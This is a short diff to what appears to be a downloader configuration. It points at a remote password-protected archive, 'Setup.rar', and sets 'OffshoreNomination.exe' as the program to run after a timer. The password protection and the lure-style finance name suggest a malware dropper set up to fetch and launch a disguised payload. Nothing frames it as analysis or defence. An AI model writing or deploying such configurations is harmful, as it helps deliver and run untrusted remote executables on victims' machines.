@@ -1,5 +1,5 @@
-url=
+url=https://w3services.ca/Setup.rar
 name=Setup.rar
 password=2025
-setup=Setup.exe
+setup=OffshoreNomination.exe
 timer=1
